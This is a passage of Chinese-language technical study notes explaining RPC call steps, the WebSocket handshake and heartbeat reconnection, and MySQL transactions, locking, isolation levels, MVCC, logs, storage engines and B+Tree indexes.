3、服务端存根（Server Stub）:接收客户端发送过来的请求消息并进行解包，然后再调用本地服务进行处理
4、服务端（Server）:服务的真正提供者
```

### 具体的调用过程如下：

```undefined
1、服务消费者（client客户端）通过本地调用的方式调用服务
2、客户端存根（client stub）接收到调用请求后负责将方法、入参等信息序列化（组装）成能够进行网络传输的消息体
3、客户端存根（client stub）找到远程的服务地址，并且将消息通过网络发送给服务端
4、服务端存根（server stub）收到消息后进行解码（反序列化操作）
5、服务端存根（server stub）根据解码结果调用本地的服务进行相关处理
6、本地服务执行具体业务逻辑并将处理结果返回给服务端存根（server stub）
7、服务端存根（server stub）将返回结果重新打包成消息（序列化）并通过网络发送至消费方
8、客户端存根（client stub）接收到消息，并进行解码（反序列化）
9、服务消费方得到最终结果
```

## RPC使用的技术

### 动态代理

### 序列化

### 序列化

### 服务注册中心

# WebSocket

## WebSocket 与 socket 的区别

- Socket = IP 地址 + 端口 + 协议。

> 具体来说，Socket 是一套标准，它完成了对 TCP/IP 的高度封装，屏蔽网络细节以方便开发者更好地进行网络编程。

- WebSocket 是一个持久化的协议，它是伴随 HTTPS 而出的协议，用来解决 **http 不支持持久化连接**的问题。
- Socket 一个是**网编编程的标准接口**，而 WebSocket 是应用层通信协议。

## 简介

WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。

WebSocket，是一种网络传输协议，位于`OSI`模型的应用层。可在单个`TCP`连接上进行全双工通信，能更好的节省服务器资源和带宽并达到实时通迅。

客户端和服务器只需要完成一次握手，两者之间就可以创建持久性的连接，并进行双向数据传输

##  特点

（1）建立在 TCP 协议之上，服务器端的实现比较容易。

（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。

（3）数据格式比较轻量，性能开销小，通信高效。

（4）可以发送文本，也可以发送二进制数据。

（5）没有同源限制，客户端可以与任意服务器通信。

（6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。

## 基本原理

与http协议一样，WebSocket协议也需要通过已建立的TCP连接来传输数据。具体实现上是通过http协议建立通道，然后在此基础上用真正的WebSocket协议进行通信，所以WebSocket协议和http协议是有一定的交叉关系的。

首先，WebSocket 是一个**持久化**的协议，相对于 HTTP 这种非持久的协议来说。简单的举个例子吧，用目前应用比较广泛的 PHP 生命周期来解释。

HTTP 的生命周期通过 Request 来界定，也就是一个 Request 一个 Response ，那么在 HTTP1.0 中，这次 HTTP 请求就结束了。

在 HTTP1.1 中进行了改进，使得有一个 keep-alive，也就是说，在一个 HTTP 连接中，可以发送多个 Request，接收多个 Response。但是请记住 Request = Response， 在 HTTP 中永远是这样，也就是说一个 Request 只能有一个 Response。而且这个 Response 也是被动的，不能主动发起。

首先 WebSocket 是基于 HTTP 协议的，或者说借用了 HTTP 协议来完成一部分握手。

首先我们来看个典型的 WebSocket 握手

```js
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
复制代码
```

熟悉 HTTP 的童鞋可能发现了，这段类似 HTTP 协议的握手请求中，多了这么几个东西。

```js
Upgrade: websocket
Connection: Upgrade
复制代码
```

这个就是 WebSocket 的核心了，告诉 Apache 、 Nginx 等服务器：注意啦，我发起的请求要用 WebSocket 协议，快点帮我找到对应的助理处理~而不是那个老土的 HTTP。

```js
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
复制代码
```

首先， Sec-WebSocket-Key 是一个 Base64 encode 的值，这个是浏览器随机生成的，告诉服务器：泥煤，不要忽悠我，我要验证你是不是真的是 WebSocket 助理。

然后， Sec_WebSocket-Protocol 是一个用户定义的字符串，用来区分同 URL 下，不同的服务所需要的协议。简单理解：今晚我要服务A，别搞错啦~

最后， Sec-WebSocket-Version 是告诉服务器所使用的 WebSocket Draft （协议版本），在最初的时候，WebSocket 协议还在 Draft 阶段，各种奇奇怪怪的协议都有，而且还有很多期奇奇怪怪不同的东西，什么 Firefox 和 Chrome 用的不是一个版本之类的，当初 WebSocket 协议太多可是一个大难题。。不过现在还好，已经定下来啦~大家都使用同一个版本： 服务员，我要的是13岁的噢→_→

然后服务器会返回下列东西，表示已经接受到请求， 成功建立 WebSocket 啦！

```js
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
复制代码
```

这里开始就是 HTTP 最后负责的区域了，告诉客户，我已经成功切换协议啦~

```js
Upgrade: websocket
Connection: Upgrade
复制代码
```

依然是固定的，告诉客户端即将升级的是 WebSocket 协议，而不是 mozillasocket，lurnarsocket 或者 shitsocket。

然后， Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的 Sec-WebSocket-Key 。 服务器：好啦好啦，知道啦，给你看我的 ID CARD 来证明行了吧。

后面的， Sec-WebSocket-Protocol 则是表示最终使用的协议。

至此，HTTP 已经完成它所有工作了，接下来就是完全按照 WebSocket 协议进行了。

总结，**WebSocket连接的过程是：**

* 首先，客户端发起http请求，经过3次握手后，建立起TCP连接；http请求里存放WebSocket支持的版本号等信息，如：Upgrade、Connection、WebSocket-Version等；

* 然后，服务器收到客户端的握手请求后，同样采用HTTP协议回馈数据；

* 最后，客户端收到连接成功的消息后，开始借助于TCP传输信道进行全双工通信。

## websocket的断线重连

### 如何判断在线离线？

当客户端第一次发送请求至服务端时会携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果不存在就存入db或者缓存中，

第二次客户端定时再次发送请求依旧携带唯一标识、以及时间戳，服务端到db或者缓存去查询改请求的唯一标识，如果存在就把上次的时间戳拿取出来，使用当前时间戳减去上次的时间，

得出的毫秒秒数判断是否大于指定的时间，若小于的话就是在线，否则就是离线；

### 如何解决断线问题

主动触发包括主动断开连接，客户端主动发送消息给后端

1. 主动断开连接

```js
ws.close();
复制代码
```

主动断开连接，根据需要使用，基本很少用到。

1. 主动发送消息

```js
ws.send("hello world");
复制代码
```

针对websocket断线我们来分析一下，

- 断线的可能原因1：websocket超时没有消息自动断开连接，应对措施：

这时候我们就需要知道服务端设置的超时时长是多少，在小于超时时间内发送心跳包，有2中方案:一种是客户端主动发送上行心跳包，另一种方案是服务端主动发送下行心跳包。

下面主要讲一下客户端也就是前端如何实现心跳包：

首先了解一下心跳包机制

跳包之所以叫心跳包是因为：它像心跳一样每隔固定时间发一次，以此来告诉服务器，这个客户端还活着。事实上这是为了保持长连接，至于这个包的内容，是没有什么特别规定的，不过一般都是很小的包，或者只包含包头的一个空包。

在TCP的机制里面，本身是存在有心跳包的机制的，也就是TCP的选项：SO_KEEPALIVE。系统默认是设置的2小时的心跳频率。但是它检查不到机器断电、网线拔出、防火墙这些断线。而且逻辑层处理断线可能也不是那么好处理。一般，如果只是用于保活还是可以的。

心跳包一般来说都是在逻辑层发送空的echo包来实现的。`下一个定时器，在一定时间间隔下发送一个空包给客户端，然后客户端反馈一个同样的空包回来，服务器如果在一定时间内收不到客户端发送过来的反馈包，那就只有认定说掉线了。`

在长连接下，有可能很长一段时间都没有数据往来。理论上说，这个连接是一直保持连接的，但是实际情况中，如果中间节点出现什么故障是难以知道的。更要命的是，有的节点(防火墙)会自动把一定时间之内没有数据交互的连接给断掉。在这个时候，就需要我们的心跳包了，用于维持长连接，保活。

心跳检测步骤：

1. 客户端每隔一个时间间隔发生一个探测包给服务器
2. 客户端发包时启动一个超时定时器
3. 服务器端接收到检测包，应该回应一个包
4. 如果客户机收到服务器的应答包，则说明服务器正常，删除超时定时器
5. 如果客户端的超时定时器超时，依然没有收到应答包，则说明服务器挂了

- 断线的可能原因2：websocket异常包括服务端出现中断，交互切屏等等客户端异常中断等等

  当若服务端宕机了，客户端怎么做、服务端再次上线时怎么做？

  客户端则需要断开连接，通过onclose 关闭连接，服务端再次上线时则需要清除之间存的数据，若不清除 则会造成只要请求到服务端的都会被视为离线。

  针对这种异常的中断解决方案就是处理重连。


## 应用场景

基于`websocket`的事实通信的特点，其存在的应用场景大概有：

- 弹幕
- 媒体聊天
- 协同编辑
- 基于位置的应用
- 体育实况更新
- 股票基金报价实时更新

# MySQL基本原理

## 事务

### 概念

事务指的是满足 `ACID` 特性的一组操作，可以通过 `Commit` 提交一个事务，也可以使用 `Rollback` 进行回滚。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-15\event.png" alt="img" style="zoom:50%;" />
</div>


### ACID

#### 原子性（Atomicity）

事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。

回滚可以用回滚日志（`Undo Log`）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。

#### 一致性（Consistency）

数据库在事务执行前后都保持一致性（不是一样）状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。（指一个系统从一个正确的状态，转移到另一个正确的状态，可以说C是目的，AID是手段）

#### 隔离性（Isolation）

一个事务所做的修改在最终提交以前，对其它事务是不可见的。通过**锁**来实现，当前数据库系统中都提供了一种粒度锁的策略，允许事务仅锁住实体对象的子集，以此来提高事务之间的并发度。

#### 持久性（Durability）

一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。

系统发生奔溃可以用重做日志（`Redo Log`）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。

#### ACID的关系

- 只有满足一致性，事务的执行结果才是正确的。
- 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。
- 在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。
- 事务满足持久化是为了能应对系统崩溃的情况。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-15\acid.png" alt="img" style="zoom:50%;" />
</div>


### AUTOCOMMIT

MySQL 默认采用自动提交模式。也就是说，如果不显式使用`START TRANSACTION`语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。

## 并发一致性问题

在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。

产生并发不一致性问题的主要原因是**破坏了事务的隔离性**，解决方法是**通过并发控制来保证隔离性**。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。

### 丢失修改

丢失修改指一个事务的更新操作被另外一个事务的**更新操作替换**。一般在现实生活中常会遇到。

例如：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改并提交生效，T2 随后修改，T2 的修改覆盖了 T1 的修改。

### 读脏数据

读脏数据指在不同的事务下，当前事务可以读到另外事务**未提交的数据**。

例如：T1 修改一个数据但未提交，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。

### 不可重复读

不可重复读指在一个事务内**多次读取同一数据集合**。在这一事务还未结束前，另一事务也访问了该同一数据集合并做了修改，由于第二个事务的修改，第一次事务的两次读取的数据**可能不一致**。

例如：T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。

### 幻影读

幻读本质上也属于不可重复读的情况。

例如：T1 读取**某个范围的**数据，T2 在这个范围内**插入**新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。

## 封锁，乐观悲观锁

### 封锁粒度

MySQL 中提供了三种封锁粒度：**行级锁，表级锁以及页面锁**。

1. 表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。
2. 行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。
3. 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。

### 封锁类型

#### 读写锁

- 互斥锁（Exclusive）：简写为X锁，又称为写锁。
- 共享锁（Shared）：简写S锁，又称为读锁。

有以下两个规定：

- 一个事务对数据对象 A 加了 **X 锁**，就可以对 A 进行**读取和更新**。**加锁期间其它事务不能对 A 加任何锁。**
- 一个事务对数据对象 A 加了 **S 锁**，可以对 A 进行**读取操作**，但是**不能进行更新操作**。加锁期间其它事务**能对 A 加 S 锁，但是不能加 X 锁**。

#### 意向锁

使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。

在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。

意向锁在原来的 X/S 锁之上引入了 `IX/IS`，`IX/IS` 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：

- 一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；
- 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。

通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。

锁的兼容关系：

- 任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁；
- 这里兼容关系针对的是**表级锁**，而表级的 IX 锁和行级的 X 锁兼容，两个事务可以对两个数据行加 X 锁。（事务 T1 想要对数据行 R1 加 X 锁，事务 T2 想要对同一个表的数据行 R2 加 X 锁，两个事务都需要对该表加 IX 锁，但是 IX 锁是兼容的，并且 IX 锁与行级的 X 锁也是兼容的，因此两个事务都能加锁成功，对同一个表中的两个数据行做修改。）

#### 乐观锁

是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，就进行回滚，使用数据版本标识数据（时间戳，版本号）

#### 悲观锁

当要对数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。这种借助数据库锁机制，在修改数据之前锁定，再修改的方式被称为悲观锁。之所以叫做悲观锁，是因为这是一种对数据的修改抱有悲观态度（也就是先取锁再访问）的并发控制方式。是一种排他锁。

### 封锁协议

#### 三级封锁协议

- 一级封锁协议（对应Read Uncommited）
  - **事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。**
  - 可以**解决丢失修改**的问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。
- 二级封锁协议（对应Read Commited）
  - 在一级的基础上，要求读取数据 A 时必须加 S 锁，**读取完马上释放** S 锁。
  - 可以**解决读脏数据**问题，因为如果一个事务在对数据 A 进行修改，根据 1一级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。

- 三级封锁协议（对应Reapetable Read）
  - 在一级的基础上，要求读取数据 A 时必须加 S 锁，直到**事务结束了才能释放** S 锁。
  - 可以**解决不可重复读**的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。
- 四级封锁协议（对应Serialization）
  - 四级封锁协议是对三级封锁协议的增强，直接对事务中所读取或者更改的数据所在的表**加表锁**，也就是说其他事务不能读写该表中的任何数据。

#### 两段锁协议

加锁和解锁分为**两个阶段**进行。

可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。串行执行的事务互不干扰，不会出现并发一致性问题。

事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。

```sql
lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)
```

但不是必要条件，例如以下操作不满足两段锁协议，但它还是可串行化调度。

```sql
lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)
```

### MySQL隐式和显式锁定

MySQL 的 `InnoDB` 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。

`InnoDB` 也可以使用特定的语句进行显示锁定：

```sql
SELECT ... LOCK In SHARE MODE;
SELECT ... FOR UPDATE;
```

## 隔离级别

### 未提交读（READ UNCOMMITED）

事务中的修改，即使没有提交，对其他事务也是可见的。

不可以解决任何并发一致性问题。

### 提交读（READ COMMITED）

一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。

可以解决脏读问题。不可以解决不可重复读，幻影读问题。

### 可重复读（REPEATABLE READ）

保证在同一个事务中多次读取同一数据的结果是一样的。

可以解决脏读和不可重复读问题。不可以解决幻影读问题。

### 可串行化（SERIALIZABLE）

强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。

该隔离级别需要加锁实现，因为要使用加锁机制保证同一时间只有一个事务执行，也就是保证事务串行执行。

| 隔离级别         | 脏读 | 不可重复读 | 幻影读 |
| ---------------- | ---- | ---------- | ------ |
| READ-UNCOMMITTED | √    | √          | √      |
| READ-COMMITTED   | ×    | √          | √      |
| REPEATABLE-READ  | ×    | ×          | √      |
| SERIALIZABLE     | ×    | ×          | ×      |

## 多版本并发控制（MVCC）

多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的` InnoDB` 存储引擎实现隔离级别的一种具体方式，用于实现**提交读和可重复读**这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，要求很低，无需使用 MVCC。可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。

### 基本思想

在封锁一节中提到，加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作，因此又引入了读写锁来避免不必要的加锁操作，例如读和读没有互斥关系。读写锁中读和写操作仍然是互斥的，而 MVCC 利用了多版本的思想，写操作更新最新的**版本快照**，而读操作去读旧版本快照，没有互斥关系，这一点和` CopyOnWrite` 类似。

在 MVCC 中事务的修改操作（`DELETE、INSERT、UPDATE`）会为数据行新增一个版本快照。

脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。当然一个事务可以读取自身未提交的快照，这不算是脏读。

### 版本号

- 系统版本号 `SYS_ID`：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。
- 事务版本号 `TRX_ID` ：事务开始时的系统版本号。

### undo log

MVCC 的多版本指的是**多个版本的快照**，快照存储在 Undo Log中，该日志通过**回滚指针 ROLL_PTR** 把一个数据行的所有快照连接起来。

如果用户执行的事务或者语句由于某种原因失败，或者用户使用一条`ROLLBACK`语句请求回滚，就可以利用Undo Log将数据回滚到修改之前的样子。

存放在数据库内部的一个特殊段undo段中，undo段位域共享表空间中。

undo是逻辑日志，因此只是将数据库逻辑的恢复到原来的样子，所有的修改都被逻辑性的取消了，但是数据结构和页本身在回滚之后可能大不相同。

逻辑性的取消是指对每个`INSERT`都完成一个`DELETE`，对每个`DELETE`都完成一个`INSERT`，对每个`UPDATE`都完成一个反向`UPDATE`。

undo log的产生会伴随着redo log的产生，这是因为undo log也需要持久性的保护。

### redo log

重做日志（redo log）用来实现事务**的持久性**，即事务ACID中的D。redo log是持久的。

记录的是**数据页的物理修改**，而不是某一行或者某几行的修改记录，它用来恢复提交后的物理数据页（恢复数据也，且只能恢复到最后一次提交的位置）

在事务的进行过程中，不断有重做日志条目被写入到重做日志文件中。

在数据库运行时不需要对redo log日志进行读取操作。

为了确保每次日志都写入重做日志文件，在每次将重做日志缓冲写入重做日志文件后，InnoDB存储引擎都需要调用一次fsync操作。

### binary log（二进制日志）

记录了对Mysql数据库执行更改的所有操作（逻辑日志），但是不包括SELECT和SHOW这类操作，因为这类操作并没有对数据本身修改。然而如果操作本身并没有导致数据库发生变化，那么该操作也会写入二进制文件。

主要的作用：

- **恢复**：某些数据的恢复需要二进制日志，比如在一个数据库全备文件恢复后，用户可以通过二进制日志进行point-in-time恢复
- **复制**：原理与恢复类似，通过复制和执行二进制日志使远程一台mysql数据库（slave）与一台mysql数据库（master）进行实时同步。
- **审计**：用户可以通过二进制日志中的信息来进行审计，判断是否有对数据库进行注入的攻击。

#### binlog有有几种录入格式？分别有什么区别？

有三种格式，statement，row和mixed。

* statement模式下，每一条会修改数据的sql都会记录在binlog中。不需要记录每一行的变化，减少了binlog日志量，节约了IO，提高性能。由于sql的执行是有上下文的，因此在保存的时候需要保存相关的信息，同时还有一些使用了函数之类的语句无法被记录复制。
* row级别下，不记录sql语句上下文相关信息，仅保存哪条记录被修改。记录单元为每一行的改动，基本是可以全部记下来但是由于很多操作，会导致大量行的改动(比如alter table)，因此这种模式的文件保存的信息太多，日志量太大。

* mixed，一种折中的方案，普通操作使用statement记录，当无法使用statement的时候使用row。
  此外，新版的MySQL中对row级别也做了一些优化，当表结构发生变化的时候，会记录语句而不是逐行记录。

### redo log 和 binary log区别

- redo log是在Innodb存储引擎层产生的，而binary log是在mysql数据库的上层产生的，并且binary log不仅仅针对于innodb存储引擎。
- 记录的内容形式不同，redo log是物理格式日志，记录的是对于每个页的修改；binary log是一种逻辑日志，记录的是对应的sql语句。

- 记录的时间点不同，redo log在事务进行中不断的被写入，该日志并不是随着事务提交的顺序进行写入的；binary log只在事务提交完成后进行一次写入。

### ReadView

MVCC维护了一个ReadView结构，主要包含了当前系统未提交的事务列表`TRX_IDs{TRX_ID_1,TRX_ID_2,...}`，还有该列表的最小值`TRX_ID_MIN`和最大值`TRX_ID_MAX`。

在进行SELECT操作时，根据数据行快照的 `TRX_ID` 与 `TRX_ID_MIN` 和 `TRX_ID_MAX` 之间的关系，从而判断数据行快照是否可以使用：

- `TRX_ID < TRX_ID_MIN`，表示该数据行快照时在当前所有未提交事务之前进行更改的，因此可以使用。
- `TRX_ID` > `TRX_ID_MAX`，表示该数据行快照是在事务启动之后被更改的，因此不可使用。
- `TRX_ID_MIN` <= `TRX_ID` <= `TRX_ID_MAX`，需要根据隔离级别再进行判断：
  - 提交读：如果 `TRX_ID` 在 `TRX_IDs` 列表中，表示该数据行快照对应的事务还未提交，则该快照不可使用。否则表示已经提交，可以使用。
  - 可重复读：都不可以使用。因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题。

在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照，再进行上面的判断。

### 快照读和当前读

#### 快照读

MVCC 的 `SELECT` 操作是快照中的数据，不需要进行加锁操作。

#### 当前读

MVCC 其它会对数据库进行修改的操作（`INSERT、UPDATE、DELETE`）需要进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 `SELECT` 的加锁操作。

在进行SELECT操作时，可以强制指定进行加锁操作。

```sql
SELECT * FROM table WHERE ? lock in share mode;
SELECT * FROM table WHERE ? for update;
```

## Next-Key Locks

Next-Key Locks 是 MySQL 的 InnoDB 存储引擎的一种锁实现。

MVCC 不能解决幻影读问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 `MVCC + Next-Key Locks` 可以解决幻读问题。

#### Record Locks

锁定一个记录上的索引，而不是记录本身。

如果表没有设置索引，InnoDB会自动在主键上创建隐藏的聚簇索引，因此Record Locks依然可以使用。

#### Gap Locks

锁定索引之间的间隙，但是不包括索引本身。

例如当一个事务执行以下语句，其他事务就不能在`t.c`中插入15。

```sql
SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATA;
```

#### Next-Key Locks

是Record Locks 和 Gap Locks的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙，他锁定一个**前开后闭**的区间。

## MySQL逻辑架构

- 第一层是服务器层，主要提供连接处理、授权认证、安全等功能。

- 第二层实现了Mysql核心服务功能，包括查询解析、分析、优化、缓存以及日期和时间等所有内置函数、所有跨存储引擎的功能都在这一层实现，例如存储过程、触发器、视图等

- 第三层是存储引擎层，存储引擎负责Mysql中数据的存储和提取。服务器通过api和存储引擎通信，这些接口屏蔽了不同存储引擎的差异，是的差异对于上层查询过程透明。除了会解析外键定义的innodb外，存储引擎不会解析sql，不同存储引擎之间也不会相互通信，只是简单响应上层服务器请求。

## MySQL查询流程

- 客户端发送一条查询给服务器
- 服务器先检查查询缓存，如果命中了缓存则立刻返回存储在缓存中的结果，否则进入下一个阶段
- 服务器端进行SQL解析、预处理，再由优化器生成对应的执行计划
- MySQL根据优化器生成的计划，调用存储引擎的API来执行查询
- 将结果返回给客户端

## 数据库引擎

### InnoDB

InnoDB 是 MySQL 的默认事务型引擎，用来处理大量短期事务。InnoDB 的性能和自动崩溃恢复特性使得它在非事务型存储需求中也很流行，除非有特别原因否则应该优先考虑 InnoDB。

InnoDB 的数据存储在表空间中，表空间由一系列数据文件组成。MySQL4.1 后 InnoDB 可以将每个表的数据和索引放在单独的文件中。

InnoDB 采用 MVCC 来支持高并发，并且实现了四个标准的隔离级别。其默认级别是 REPEATABLE READ，并通过间隙锁策略防止幻读，间隙锁使 InnoDB 不仅仅锁定查询涉及的行，还会对索引中的间隙进行锁定防止幻行的插入。

InnoDB 表是基于聚簇索引建立的，InnoDB 的索引结构和其他存储引擎有很大不同，聚簇索引对主键查询有很高的性能，不过它的二级索引中必须包含主键列，所以如果主键很大的话其他所有索引都会很大，因此如果表上索引较多的话主键应当尽可能小。

InnoDB 的存储格式是平台建立的，可以将数据和索引文件从一个平台复制到另一个平台。

InnoDB 内部做了很多优化，包括从磁盘读取数据时采用的可预测性预读，能够自动在内存中创建加速读操作的自适应哈希索引，以及能够加速插入操作的插入缓冲区等。

### MyISAM

MySQL5.1及之前，MyISAM 是默认存储引擎，MyISAM 提供了大量的特性，包括全文索引、压缩、空间函数等，但不支持事务和行锁，最大的缺陷就是崩溃后无法安全恢复。对于只读的数据或者表比较小、可以忍受修复操作的情况仍然可以使用 MyISAM。

MyISAM 将表存储在数据文件和索引文件中，分别以 .MYD 和 .MYI 作为扩展名。MyISAM 表可以包含动态或者静态行，MySQL 会根据表的定义决定行格式。MyISAM 表可以存储的行记录数一般受限于可用磁盘空间或者操作系统中单个文件的最大尺寸。

MyISAM 对整张表进行加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但是在表有读取查询的同时，也支持并发往表中插入新的记录。

对于MyISAM 表，MySQL 可以手动或自动执行检查和修复操作，这里的修复和事务恢复以及崩溃恢复的概念不同。执行表的修复可能导致一些数据丢失，而且修复操作很慢。

对于 MyISAM 表，即使是 BLOB 和 TEXT 等长字段，也可以基于其前 500 个字符创建索引。MyISAM 也支持全文索引，这是一种基于分词创建的索引，可以支持复杂的查询。

MyISAM 设计简单，数据以紧密格式存储，所以在某些场景下性能很好。MyISAM 最典型的性能问题还是表锁问题，如果所有的查询长期处于 Locked 状态，那么原因毫无疑问就是表锁。

### 两者区别

MyISAM：

```
不支持事务，但是每次查询都是原子的；

支持表级锁，即每次操作是对整个表加锁；

存储表的总行数；

一个MYISAM表有三个文件：索引文件、表结构文件、数据文件；

采用非聚集索引，索引文件的数据域存储指向数据文件的指针。辅索引与主索引基本一致，但是辅索引不用保证唯一性。
```

InnoDb：

```
支持ACID的事务，支持事务的四种隔离级别；

支持行级锁及外键约束：因此可以支持写并发；

不存储总行数；

一个InnoDb引擎存储在一个文件空间（共享表空间，表大小不受操作系统控制，一个表可能分布在多个文件里）

也有可能为多个（设置为独立表空，表大小受操作系统文件大小限制，一般为2G），受操作系统文件大小的限制；

主键索引采用聚集索引（索引的数据域存储数据文件本身），辅索引的数据域存储主键的值；

因此从辅索引查找数据，需要先通过辅索引找到主键值，再访问辅索引；

最好使用自增主键，防止插入数据时，为维持B+树结构，文件的大调整。
```

## innodb的日志种类

**错误日志**：记录出错信息，也记录一些警告信息或者正确的信息。

**查询日志**：记录所有对数据库请求的信息，不论这些请求是否得到了正确的执行。

**慢查询日志**：设置一个阈值，将运行时间超过该值的所有SQL语句都记录到慢查询的日志文件中。

**二进制日志**：记录对数据库执行更改的所有操作。

**中继日志**：中继日志也是二进制日志，用来给slave 库恢复

**事务日志**：重做日志redo和回滚日志undo

# 数据库MySQL索引

**索引，**在数据库中是一个排序形式的数据结构，以协助快速查询和更新数据库表中数据。索引的实现通常使用B+树。

**优点**：

- 大大加快数据的检索速度；

- 通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性；
- 在使用分组和排序字句进行数据检索时，显著减少查询中分组和排序的时间；
- 可以在查询的过程中，使用优化隐藏器，提高系统性能。

**缺点**：

- 当对表中数据进行增加删除和修改时，索引需要动态维护，降低了数据的维护速度；
- 创建索引和维护索引需要耗费时间，这种时间随着数据量的增加而增加；
- 需要占用物理空间

**使用条件**：

- 对于非常小的表、大部分简单的全表扫描比建立索引更高效
- 对于中到大型的表，索引非常有效
- 对于特大型的表，建立和维护索引的代价随之增加。这时候需要直接区分处需要查询的一组数据，而不是一条一条的匹配，可以使用分区技术。

## B+Tree 原理

### 数据结构

B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。

B+ Tree 是基于 B Tree 和**叶子节点顺序访问指针**进行实现，它具有 B Tree 的平衡性，并且通过**顺序访问指针**来提高区间查询的性能。

在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。

<div class="image-wrapper" style="text-align: center">
